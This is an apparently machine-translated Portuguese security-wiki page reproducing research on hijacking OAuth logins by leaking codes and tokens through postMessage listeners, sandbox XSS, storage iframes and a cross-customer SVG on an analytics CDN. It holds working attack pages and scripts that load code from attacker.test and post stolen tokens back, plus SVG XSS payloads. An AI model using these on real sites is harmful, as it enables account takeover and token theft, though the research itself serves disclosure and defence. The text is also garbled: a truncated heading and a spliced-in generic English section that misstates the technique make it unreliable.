# OAuth - Fluxos Felizes, XSS, Iframes e Mensagens POST para vazar c√≥digos e valores de estado

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Este conte√∫do foi retirado de** [**https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url**](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)****

## Explica√ß√£o dos diferentes fluxos OAuth

### Tipos de resposta

Primeiro, existem diferentes tipos de resposta que voc√™ pode usar no fluxo OAuth. Essas respostas concedem o **token para fazer login como os usu√°rios ou as informa√ß√µes necess√°rias para faz√™-lo**.

Os tr√™s mais comuns s√£o:

1. **`code` + `state`**. O **c√≥digo** √© usado para **chamar o servidor do provedor OAuth** para obter um token. O par√¢metro **state** √© usado para verificar se o **usu√°rio correto est√° fazendo a chamada**. √â responsabilidade do cliente OAuth validar o par√¢metro de estado antes de fazer a chamada do lado do servidor para o provedor OAuth.
2. **`id_token`**. √â um JSON Web Token **(JWT) assinado** usando um certificado p√∫blico do provedor OAuth para verificar se a identidade fornecida √© realmente quem ela afirma ser.
3. **`token`**. √â um **token de acesso** usado na API do provedor de servi√ßos.

### Modos de resposta

Existem diferentes modos que o fluxo de autoriza√ß√£o pode usar para fornecer os c√≥digos ou tokens para o site no fluxo OAuth, estes s√£o quatro dos mais comuns:

1. **Query**. Enviando par√¢metros de consulta como um redirecionamento de volta para o site (`https://example.com/callback?code=xxx&state=xxx`). Usado para `code+state`. O **c√≥digo** s√≥ pode ser **usado uma vez** e voc√™ precisa do **segredo do cliente OAuth** para **adquirir um token de acesso** ao usar o c√≥digo.&#x20;
   1. [Este modo n√£o √© recomendado para tokens](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#id\_token) pois **os tokens podem ser usados v√°rias vezes e n√£o devem acabar em logs do servidor ou similares**. A maioria dos provedores OAuth n√£o suporta esse modo para tokens, apenas para c√≥digo. Exemplos:
      * `response_mode=query` √© usado pela Apple.
        * `response_type=code` √© usado pelo Google ou Facebook.
2. **Fragment**. Usando um **redirecionamento de fragmento** (`https://example.com/callback#access_token=xxx`). Neste modo, a parte do fragmento da URL n√£o acaba em nenhum log do servidor e s√≥ pode ser alcan√ßada do lado do cliente usando javascript. Este modo de resposta √© usado para tokens. Exemplos:
   * `response_mode=fragment` √© usado pela Apple e Microsoft.
   * `response_type` cont√©m `id_token` ou `token` e √© usado pelo Google, Facebook, Atlassian e outros.
3. **Web-message**. Usando **postMessage para uma origem fixa do site**:\
   `postMessage('{"access_token":"xxx"}','https://example.com')`\
   Se suportado, muitas vezes pode ser usado para todos os diferentes tipos de resposta. Exemplos:
   * `response_mode=web_message` √© usado pela Apple.
   * `redirect_uri=storagerelay://...` √© usado pelo Google.
   * `redirect_uri=https://staticxx.facebook.com/.../connect/xd_arbiter/...` √© usado pelo Facebook.
4. **Form-post**. Usando um post de formul√°rio para um `redirect_uri` v√°lido, um **pedido POST regular √© enviado de volta para o site**. Isso pode ser usado para c√≥digo e tokens. Exemplos:
   * `response_mode=form_post` √© usado pela Apple.
   * `ux_mode=redirect&login_uri=https://example.com/callback` √© usado pelo Google Sign-In (GSI).

## Quebrando o `state` intencionalmente <a href="#break-state-intentionally" id="break-state-intentionally"></a>

A especifica√ß√£o OAuth recomenda um par√¢metro `state` em combina√ß√£o com um `response_type=code` para garantir que o usu√°rio que iniciou o fluxo tamb√©m √© o que est√° usando o c√≥digo ap√≥s o fluxo OAuth para emitir um token.

No entanto, se o **valor do `state` for inv√°lido**, o **`code` n√£o ser√° consumido** porque √© responsabilidade do site (o final) validar o estado. Isso significa que se um atacante puder enviar um link de fluxo de login para uma v√≠tima contaminada com um `state` v√°lido do atacante, o fluxo OAuth falhar√° para a v√≠tima e o `code` nunca ser√° enviado ao provedor OAuth. O c√≥digo ainda ser√° poss√≠vel de usar se o atacante puder obt√™-lo.

1. O atacante inicia um fluxo de login no site usando "Entrar com X".
2. O atacante usa o valor `state` e constr√≥i um link para a v√≠tima fazer login com o provedor OAuth, mas com o `state` do atacante.
3. A v√≠tima faz login com o link e √© redirecionada de volta para o site.
4. O site valida o `state` para a v√≠tima e interrompe o processamento do fluxo de login, pois n√£o √© um estado v√°lido. P√°gina de erro para a v√≠tima.
5. O atacante encontra uma maneira de vazar o `code` da p√°gina de erro.
6. O atacante agora pode fazer login com seu pr√≥prio `state` e o `code` vazado da v√≠tima.

### Tro
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
ir√° redirecionar para `https://example.com/callback?code=xxx&state=yyy`. Mas:
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code,id_token&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
ir√° redirecionar para `https://example.com/callback#code=xxx&state=yyy&id_token=zzz`.

A mesma ideia se aplica √† Apple se voc√™ usar:
```
https://appleid.apple.com/auth/authorize?
response_type=code&
response_mode=query&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
voc√™ ser√° redirecionado para `https://example.com/callback?code=xxx&state=yyy`, mas:
```
https://appleid.apple.com/auth/authorize?
response_type=code+id_token&
response_mode=fragment&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
Ser√° redirecionado para `https://example.com/callback#code=xxx&state=yyy&id_token=zzz`.

## Caminhos N√£o Felizes

O autor da pesquisa chamou de **caminhos n√£o felizes** aqueles em que o usu√°rio faz login via OAuth e √© redirecionado para URLs incorretas. Isso √© √∫til porque se o cliente receber o token ou um estado+codigo v√°lido **mas n√£o chegar √† p√°gina esperada**, essa **informa√ß√£o n√£o ser√° consumida corretamente** e se o atacante encontrar uma maneira de **extrair essa informa√ß√£o** do "caminho n√£o feliz", ele poder√° **assumir o controle da conta**.

Por padr√£o, o fluxo OAuth chegar√° ao caminho esperado, no entanto, pode haver algumas **configura√ß√µes incorretas** potenciais que permitiriam a um atacante **criar uma solicita√ß√£o OAuth inicial espec√≠fica** que far√° com que o **usu√°rio chegue a um caminho n√£o feliz ap√≥s fazer login**.

### Incompatibilidades de URI de redirecionamento

Essas **configura√ß√µes incorretas** "comuns" foram encontradas na **URL de redirecionamento** da comunica√ß√£o OAuth.

A [**especifica√ß√£o**](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-19#section-2.1) **** indica estritamente que a URL de redirecionamento deve ser estritamente comparada com a definida, n√£o permitindo altera√ß√µes al√©m da apar√™ncia ou n√£o da porta. No entanto, alguns endpoints permitiam algumas modifica√ß√µes:

### Adi√ß√£o de caminho de URI de redirecionamento

Alguns provedores OAuth **permitem a adi√ß√£o de dados adicionais** ao caminho para `redirect_uri`. Isso tamb√©m viola a especifica√ß√£o da mesma forma que para "Mudan√ßa de caso de URI de redirecionamento". Por exemplo, tendo um URI de redirecionamento `https://example.com/callback`, enviando:
```
response_type=id_token&
redirect_uri=https://example.com/callbackxxx
```
### Adi√ß√£o de par√¢metros de redirecionamento-uri

Alguns provedores OAuth **permitem a adi√ß√£o de par√¢metros de consulta ou fragmento** ao `redirect_uri`. Voc√™ pode usar isso ao acionar um caminho n√£o feliz, fornecendo os mesmos par√¢metros que ser√£o adicionados √† URL. Por exemplo, tendo um redirecionamento uri `https://example.com/callback`, enviando:
```
response_type=code&
redirect_uri=https://example.com/callback%3fcode=xxx%26
```
acabaria nestes casos como um redirecionamento para `https://example.com/callback?code=xxx&code=real-code`. Dependendo do site que recebe **m√∫ltiplos par√¢metros com o mesmo nome, isso tamb√©m poderia desencadear um caminho n√£o feliz**. O mesmo se aplica a `token` e `id_token`:
```
response_type=code&
redirect_uri=https://example.com/callback%23id_token=xxx%26
```
### Caminhos felizes do OAuth, XSS, iframes e post-messages para vazar valores de c√≥digo e estado

## Caminhos felizes do OAuth

Os caminhos felizes do OAuth s√£o aqueles em que tudo ocorre conforme o esperado. No entanto, existem casos em que o fluxo pode ser interrompido, como quando h√° m√∫ltiplos par√¢metros com o mesmo nome na URL de retorno. Isso pode resultar em uma URL de retorno como `https://example.com/callback#id_token=xxx&id_token=real-id_token`. Dependendo do **javascript que busca os par√¢metros de fragmento quando h√° m√∫ltiplos par√¢metros com o mesmo nome**, isso tamb√©m pode resultar em um caminho n√£o feliz.

### Sobras ou configura√ß√µes incorretas de redirect-uri

Ao coletar todas as URLs de login contendo os valores `redirect_uri`, tamb√©m √© poss√≠vel testar se outros valores de redirect-uri s√£o v√°lidos. Dos 125 fluxos de login do Google que salvei dos sites que testei, 5 sites tinham a p√°gina inicial tamb√©m como um `redirect_uri` v√°lido. Por exemplo, se `redirect_uri=https://auth.example.com/callback` fosse o valor usado, nesses 5 casos, qualquer um desses valores tamb√©m seria v√°lido:

* `redirect_uri=https://example.com/`
* `redirect_uri=https://example.com`
* `redirect_uri=https://www.example.com/`
* `redirect_uri=https://www.example.com`

Isso foi especialmente interessante para os sites que realmente usavam `id_token` ou `token`, j√° que `response_type=code` ainda ter√° o provedor OAuth validando o `redirect_uri` na √∫ltima etapa da dan√ßa do OAuth ao adquirir um token.

## Gadget 1: Ouvintes de postMessage com verifica√ß√£o de origem fraca ou inexistente que vazam URL

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-1-1024x582.png)

**Neste exemplo, o √∫ltimo caminho n√£o feliz em que o token/c√≥digo estava sendo enviado estava enviando uma mensagem de solicita√ß√£o de postagem vazando location.href.**\
Um exemplo foi um SDK de an√°lise para um site popular que foi carregado em sites:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example1.png)

Este SDK exp√¥s um ouvinte de postMessage que enviou a seguinte mensagem quando o tipo de mensagem correspondia:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example2.png)

Enviando uma mensagem para ele de uma origem diferente:
```javascript
openedwindow = window.open('https://www.example.com');
...
openedwindow.postMessage('{"type":"sdk-load-embed"}','*');
```
Uma mensagem de resposta apareceria na janela que enviou a mensagem contendo o `location.href` do site:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example3.png)

O fluxo que poderia ser usado em um ataque dependia de como c√≥digos e tokens eram usados para o fluxo de login, mas a ideia era:

### **Ataque**

1. O atacante envia ao usu√°rio um **link criado** que foi preparado para **resultar em um caminho n√£o feliz** na dan√ßa do OAuth.
2. A v√≠tima **clica** no link. Uma nova aba √© aberta com um fluxo de **login** com um dos provedores OAuth do site sendo explorado.
3. O caminho n√£o feliz √© acionado no site sendo explorado, o **ouvinte de postMessage vulner√°vel √© carregado na p√°gina em que a v√≠tima pousou, ainda com o c√≥digo ou tokens na URL**.
4. A **aba original** enviada pelo atacante envia um monte de **postMessages** para a nova aba com o site para fazer com que o ouvinte de postMessage vaze a URL atual.
5. A aba original enviada pelo atacante ent√£o **ouve a mensagem enviada para ela**. Quando a URL retorna em uma mensagem, o **c√≥digo e token s√£o extra√≠dos** e enviados ao atacante.
6. **Atacante faz login como a v√≠tima** usando o c√≥digo ou token que acabou no caminho n√£o feliz.

## Gadget 2: XSS em dom√≠nio sandbox/terceiro que obt√©m a URL

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-2-1024x582.png)

&#x20;

## **Gadget 2: exemplo 1, roubando window.name de um iframe sandbox**

Este tinha um **iframe** carregado na **p√°gina onde a dan√ßa do OAuth terminou**. O **nome** do **iframe** era uma **vers√£o JSON-stringified do objeto `window.location`**. Esta √© uma maneira antiga de transferir dados entre dom√≠nios, j√° que a p√°gina no iframe pode ter seu pr√≥prio `window.name` definido pelo pai:
```javascript
i = document.createElement('iframe');
i.name = JSON.stringify(window.location)
i.srcdoc = '<script>console.log("my name is: " + window.name)</script>';
document.body.appendChild(i)
```
O dom√≠nio carregado no **iframe tamb√©m tinha um XSS simples**:
```
https://examplesandbox.com/embed_iframe?src=javascript:alert(1)
```
### Ataque

Se voc√™ tiver um **XSS** em um **dom√≠nio** em uma janela, essa janela pode ent√£o **alcan√ßar outras janelas da mesma origem** se houver uma rela√ß√£o de pai/filho/opener entre as janelas.

Isso significa que um invasor poderia **explorar o XSS para carregar uma nova guia** com o **link OAuth criado** que terminar√° no **caminho que carrega o iframe com o token no nome**. Ent√£o, a partir da p√°gina explorada pelo XSS, ser√° poss√≠vel **ler o nome do iframe** porque ele tem um **opener sobre a p√°gina pai dos iframes** e exfiltr√°-lo.

Mais especificamente:

1. Criar uma p√°gina maliciosa que esteja incorporando um iframe do sandbox com o XSS carregando meu pr√≥prio script:

    ```html
    <div id="leak"><iframe src="https://examplesandbox.com/embed_iframe?src=javascript:
    x=createElement('script'),
    x.src='//attacker.test/inject.js',
    document.body.appendChild(x);" 
    style="border:0;width:500px;height:500px"></iframe></div>
    ```
2. No meu script carregado no sandbox, substitu√≠ o conte√∫do com o link a ser usado para a v√≠tima:

    ```javascript
    document.body.innerHTML = 
    '<a href="#" onclick="
    b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
    Clique aqui para sequestrar o token</a>';
    ```

    Tamb√©m iniciei um script em um intervalo para verificar se o link foi aberto e se o iframe que eu queria alcan√ßar est√° l√° para obter o `window.name` definido no iframe com a mesma origem que o iframe na p√°gina do invasor:

    ```javascript
    x = setInterval(function() {
    if(parent.window.b &&
     parent.window.b.frames[0] &&
     parent.window.b.frames[0].window &&
     parent.window.b.frames[0].window.name) {
       top.postMessage(parent.window.b.frames[0].window.name, '*');
       parent.window.b.close();
       clearInterval(x);
    }
    }, 500);
    ```
3. A p√°gina do invasor pode ent√£o apenas ouvir a mensagem que acabamos de enviar com o `window.name`:

    ```html
    <script>
    window.addEventListener('message', function (e) {
     if (e.data) {
         document.getElementById('leak').innerText = 'Roubamos o token: ' + e.data;
     }
    });
    </script>
    ```

## **Gadget 2: exemplo 2, iframe com XSS + verifica√ß√£o de origem pai**

O segundo exemplo foi um **iframe** carregado no **caminho n√£o feliz** com um XSS **usando postMessage**, mas **as mensagens s√≥ eram permitidas do `parent`** que o carregou. O **`location.href` foi enviado para o iframe quando ele pediu `initConfig`** em uma mensagem para a janela `parent`.

A janela principal carregou o iframe assim:
```html
<iframe src="https://challenge-iframe.example.com/"></iframe>
```
# Oauth Happy Paths: XSS, Iframes and Post Messages to Leak Code and State Values

## Introduction

This document explains how to exploit Oauth Happy Paths to leak code and state values using XSS, iframes and post messages.

## Oauth Happy Paths

Oauth Happy Paths are the different flows that an Oauth client can follow to obtain an access token from an Oauth provider. These flows are defined in the Oauth specification and are implemented by Oauth providers.

## Exploiting Oauth Happy Paths

An attacker can exploit Oauth Happy Paths to leak code and state values by injecting malicious code into the Oauth provider's login page. This can be done using XSS, iframes and post messages.

### XSS

XSS can be used to inject malicious code into the Oauth provider's login page. This code can then be used to steal the user's access token and other sensitive information.

### Iframes

If the Oauth provider's login page is vulnerable to clickjacking, an attacker can use iframes to load the login page and steal the user's access token and other sensitive information.

### Post Messages

Post messages can be used to communicate between different windows or iframes. An attacker can use post messages to steal the user's access token and other sensitive information.

## Conclusion

Oauth Happy Paths can be exploited to leak code and state values using XSS, iframes and post messages. It is important for Oauth providers to implement proper security measures to prevent these attacks.
```html
<script>
window.addEventListener('message', function (e) {
  if (e.source !== window.parent) {
    // not a valid origin to send messages
    return;
  }
  if (e.data.type === 'loadJs') {
    loadScript(e.data.jsUrl);
  } else if (e.data.type === 'initConfig') {
    loadConfig(e.data.config);
  }
});
</script>
```
### Ataque

Neste caso, o **atacante carrega um iframe com a p√°gina vulner√°vel de XSS de post-message** e **explora** o **XSS** para carregar **JS arbitr√°rio**. Este **JS** ir√° **abrir** uma **guia** com o **link OAuth**. Ap√≥s o login, a p√°gina final cont√©m o token na URL e carregou um iframe (o iframe vulner√°vel de post-message XSS).

Em seguida, o **JS arbitr√°rio** (do XSS explorado) tem um **abridor para essa guia**, ent√£o ele **acessa o iframe** e faz com que ele **pe√ßa ao pai pelo `initConfig`** (que cont√©m a **URL com o token**). A p√°gina pai **fornece-o ao iframe**, que tamb√©m √© comandado para **vaz√°-lo**.

Neste caso, eu poderia fazer um m√©todo semelhante ao exemplo anterior:

1. Criar uma **p√°gina maliciosa** que esteja incorporando um **iframe do sandbox**, anexar um **onload** para **disparar um script quando o iframe √© carregado**.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://challenge-iframe.example.com/"
    onload="run()"
    style="border:0;width:500px;height:500px"></iframe></div>
    ```
2. Como a **p√°gina maliciosa √© ent√£o o pai** do iframe, ela poderia **enviar uma mensagem para o iframe para carregar nosso script** na origem do sandbox usando **postMessage (XSS)**:

    ```html
    <script>
    function run() {
      i.postMessage({type:'loadJs',jsUrl:'https://attacker.test/inject.js'}, '*')
    }
    </script>
    ```
3. No meu script sendo carregado no sandbox, eu substitu√≠ o conte√∫do pelo **link para a v√≠tima**:

    ```javascript
    document.body.innerHTML = '<a href="#" onclick="
    b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
    Clique aqui para sequestrar o token</a>';
    ```

    Eu tamb√©m iniciei um script em um intervalo para **verificar se o link foi aberto e se o iframe que eu queria alcan√ßar estava l√°**, para executar javascript dentro dele do meu iframe para a janela principal. Em seguida, anexei um ouvinte de postMessage que passou a mensagem de volta para o meu iframe na janela maliciosa:

    ```javascript
    x = setInterval(function() {
      if(b && b.frames[1]) {
        b.frames[1].eval(
          'onmessage=function(e) { top.opener.postMessage(e.data, "*") };' +
          'top.postMessage({type:'initConfig'},"*")'
        )
        clearInterval(x)
      }
    }, 500);
    ```
4. A p√°gina do atacante que tinha o iframe carregado pode ent√£o ouvir a mensagem que enviei do ouvinte de postMessage injetado no iframe da janela principal:

    ```html
    <script>
    window.addEventListener('message', function (e) {
     if (e.data) {
         document.getElementById('leak').innerText = 'Roubamos o token: ' + JSON.stringify(e.data);
     }
    });
    </script>
    ```

## Gadget 3: Usando APIs para buscar URL fora dos limites

![](https://labs.detectify.com/wp-content/uploads/2022/06/Gadget-3--1024x582.png)

Este gadget acabou sendo o mais divertido. H√° algo satisfat√≥rio em enviar a v√≠tima para algum lugar e depois pegar dados sens√≠veis de um local diferente.

## **Gadget 3: exemplo 1, storage-iframe sem verifica√ß√£o de origem**

O primeiro exemplo usou um servi√ßo externo para dados de rastreamento. Este servi√ßo adicionou um "iframe de armazenamento":
```html
<iframe
  id="tracking"
  name="tracking"
  src="https://cdn.customer1234.analytics.example.com/storage.html">
</iframe>
```
A janela principal se comunicaria com este iframe usando postMessage para enviar dados de rastreamento que seriam salvos no localStorage da origem em que o `storage.html` estava localizado:
```javascript
tracking.postMessage('{"type": "put", "key": "key-to-save", "value": "saved-data"}', '*');
```
A janela principal tamb√©m pode buscar esse conte√∫do:
```javascript
tracking.postMessage('{"type": "get", "key": "key-to-save"}', '*');
```
Quando o iframe foi carregado na inicializa√ß√£o, uma chave foi salva para a √∫ltima localiza√ß√£o do usu√°rio usando `location.href`:
```javascript
tracking.postMessage('{"type": "put", "key": "last-url", "value": "https://example.com/?code=test#access_token=test"}', '*');
```
Se voc√™ pudesse conversar com essa origem de alguma forma e faz√™-la enviar o conte√∫do, o `location.href` poderia ser obtido a partir desse armazenamento. O ouvinte de postMessage para o servi√ßo tinha uma lista de bloqueio e uma lista de permiss√£o de origens. Parece que o servi√ßo de an√°lise permitiu que o site definisse quais origens permitir ou negar:
```javascript
var blockList = [];
var allowList = [];
var syncListeners = [];

window.addEventListener('message', function(e) {
  // If there's a blockList, check if origin is there and if so, deny
  if (blockList && blockList.indexOf(e.origin) !== -1) {
    return;
  }
  // If there's an allowList, check if origin is there, else deny
  if (allowList && allowList.indexOf(e.origin) == -1) {
    return;
  }
  // Only parent can talk to it
  if (e.source !== window.parent) {
    return;
  }
  handleMessage(e);
});

function handleMessage(e) {
  if (data.type === 'sync') {
    syncListeners.push({source: e.source, origin: e.origin})
  } else {
  ...
}

window.addEventListener('storage', function(e) {
  for(var i = 0; i < syncListeners.length; i++) {
    syncListeners[i].source.postMessage(JSON.stringify({type: 'sync', key: e.key, value: e.newValue}), syncListeners[i].origin);
  }
}
```
Al√©m disso, se voc√™ tivesse uma origem v√°lida com base na `allowList`, tamb√©m seria capaz de solicitar uma sincroniza√ß√£o, o que lhe daria todas as altera√ß√µes feitas no localStorage nesta janela enviadas para voc√™ quando foram feitas.

### Ataque

No site que tinha esse armazenamento carregado no caminho n√£o feliz da dan√ßa do OAuth, nenhuma origem da `allowList` foi definida; **isso permitiu que qualquer origem falasse com o ouvinte de postMessage** se a origem fosse o `parent` da janela:

1. Eu criei uma p√°gina maliciosa que incorporava um iframe do cont√™iner de armazenamento e anexei um `onload` para acionar um script quando o iframe √© carregado.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://cdn.customer12345.analytics.example.com/storage.html"
    onload="run()"></iframe></div>
    ```
2. Como a p√°gina maliciosa agora era o pai do iframe e nenhuma origem foi definida na `allowList`, a p√°gina maliciosa poderia enviar mensagens para o iframe para dizer ao armazenamento para enviar mensagens para quaisquer atualiza√ß√µes no armazenamento. Eu tamb√©m poderia adicionar um ouvinte √† p√°gina maliciosa para ouvir quaisquer atualiza√ß√µes de sincroniza√ß√£o do armazenamento:

    ```html
    <script>
    function run() {
      i.postMessage({type:'sync'}, '*')
    }
    window.addEventListener('message', function (e) {
     if (e.data && e.data.type === 'sync') {
         document.getElementById('leak').innerText = 'Roubamos o token: ' + JSON.stringify(e.data);
     }
    });
    </script>
    ```
3. A p√°gina maliciosa tamb√©m conteria um link regular para a v√≠tima clicar:

    ```html
    <a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?..."
    target="_blank">Clique aqui para sequestrar o token</a>';
    ```
4. A v√≠tima clicaria no link, passaria pela dan√ßa do OAuth e acabaria no caminho n√£o feliz carregando o script de rastreamento e o iframe de armazenamento. O iframe de armazenamento recebe uma atualiza√ß√£o de `last-url`. O evento `window.storage` seria acionado no iframe da p√°gina maliciosa, uma vez que o localStorage foi atualizado, e a p√°gina maliciosa que agora estava recebendo atualiza√ß√µes sempre que o armazenamento mudava receberia uma postMessage com a URL atual da v√≠tima:

    <figure><img src="https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example2.png" alt=""><figcaption></figcaption></figure>

## **Gadget 3: exemplo 2, mistura de clientes no CDN - DIY storage-SVG sem verifica√ß√£o de origem**

Como o pr√≥prio servi√ßo de an√°lise tinha um programa de recompensas por bugs, tamb√©m fiquei interessado em ver se poderia encontrar uma maneira de vazar URLs tamb√©m para os sites que haviam configurado origens adequadas para o iframe de armazenamento.

Quando comecei a procurar o dom√≠nio `cdn.analytics.example.com` online sem a parte do cliente, notei que esse CDN tamb√©m continha imagens enviadas pelos clientes do servi√ßo:
```
https://cdn.analytics.example.com/img/customer42326/event-image.png
https://cdn.analytics.example.com/img/customer21131/test.png
```
Tamb√©m notei que havia arquivos SVG servidos inline como `Content-type: image/svg+xml` neste CDN:
```
https://cdn.analytics.example.com/img/customer54353/icon-register.svg
```
Eu me registrei como usu√°rio de teste no servi√ßo e carreguei meu pr√≥prio ativo, que tamb√©m apareceu no CDN:
```
https://cdn.analytics.example.com/img/customer94342/tiger.svg
```
A parte interessante foi que, se voc√™ usasse o subdom√≠nio espec√≠fico do cliente para o CDN, a imagem ainda era servida. Esta URL funcionou:
```
https://cdn.customer12345.analytics.example.com/img/customer94342/tiger.svg
```
Isso significava que o cliente com ID #94342 poderia renderizar arquivos SVG no armazenamento do cliente #12345.

Eu carreguei um arquivo SVG com um payload XSS simples:

`https://cdn.customer12345.analytics.example.com/img/customer94342/test.svg`
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 500 500" width="100%" height="100%" version="1.1">
<script xlink:href="data:,alert(document.domain)"></script>
</svg>
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

N√£o √© √≥timo. O CDN adicionou um cabe√ßalho `Content-Security-Policy: default-src 'self'` para tudo sob `img/`. Voc√™ tamb√©m pode ver que o cabe√ßalho do servidor mencionou o S3 - revelando que o conte√∫do foi carregado em um bucket S3:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example5.png)

Uma peculiaridade interessante do S3 √© que os diret√≥rios n√£o s√£o realmente diret√≥rios no S3; o caminho antes da chave √© chamado de "prefixo". Isso significa que o S3 n√£o se importa se `/` s√£o codificados em URL ou n√£o, ele ainda servir√° o conte√∫do se voc√™ codificar em URL cada barra na URL. Se eu mudasse `img/` para `img%2f` na URL, a imagem ainda seria exibida. No entanto, nesse caso, o cabe√ßalho CSP foi removido e o XSS foi acionado:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example6.png)

Eu ent√£o carreguei um SVG que criaria a mesma forma de manipulador de armazenamento e ouvinte de postMessage como o `storage.html` regular, mas com uma `allowList` vazia. Isso me permitiu fazer o mesmo tipo de ataque mesmo em sites que haviam definido corretamente as origens permitidas que poderiam falar com o armazenamento.

Eu carreguei um SVG que parecia com isso: 

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 5 5" width="100%" height="100%" version="1.1">
<script xlink:href="data:application/javascript;base64,dmFyIGJsb2NrTGlzdCA9IFtdOwp2YXIgYWxsb3dMaXN0ID0gW107Ci4uLg=="></script>
</svg>
```
Eu poderia ent√£o utilizar a mesma metodologia do exemplo #1, mas em vez de colocar o `storage.html` em um iframe, eu poderia colocar o SVG com a barra codificada em URL:
```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg"
onload="run()"></iframe></div>
```
Como nenhum site seria capaz de corrigir isso sozinho, enviei um relat√≥rio para o provedor de an√°lise respons√°vel pelo CDN:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

A ideia de olhar para bugs de configura√ß√£o incorreta em terceiros era principalmente para confirmar que existem v√°rias maneiras de vazar os tokens e, como o terceiro tinha um programa de recompensas por bugs, este era apenas um receptor diferente para o mesmo tipo de bug, a diferen√ßa sendo que o impacto era para todos os clientes do servi√ßo de an√°lise. Neste caso, o cliente do terceiro na verdade tinha a capacidade de configurar corretamente a ferramenta para n√£o vazar dados para o atacante. No entanto, como os dados sens√≠veis ainda eram enviados para o terceiro, foi interessante ver se havia alguma maneira de contornar completamente a configura√ß√£o adequada da ferramenta pelo cliente.

## **Gadget 3: exemplo 3, API de chat-widget**

O √∫ltimo exemplo foi baseado em um chat-widget que estava presente em todas as p√°ginas de um site, at√© mesmo nas p√°ginas de erro. Havia v√°rios ouvintes de postMessage, um deles sem uma verifica√ß√£o de origem adequada que permitia apenas iniciar o pop-up do chat. Outro ouvinte tinha uma verifica√ß√£o rigorosa de origem para que o chat-widget recebesse uma chamada de inicializa√ß√£o e o token da API de chat atual que estava sendo usado pelo usu√°rio atual.
```html
<iframe src="https://chat-widget.example.com/chat"></iframe>
<script>
window.addEventListener('message', function(e) {
  if (e.data.type === 'launch-chat') {
    openChat();
  }
});

function openChat() {
  ...
}

var chatApiToken;
window.addEventListener('message', function(e) {
  if (e.origin === 'https://chat-widget.example.com') {
    if (e.data.type === 'chat-widget') {
      if (e.data.key === 'api-token') {
        chatApiToken = e.data.value;
      }
      if(e.data.key === 'init') {
        chatIsLoaded();
      }
    }
  }
});

function chatIsLoaded() {
  ...
}
</script>
```
Quando o chat-iframe √© carregado:

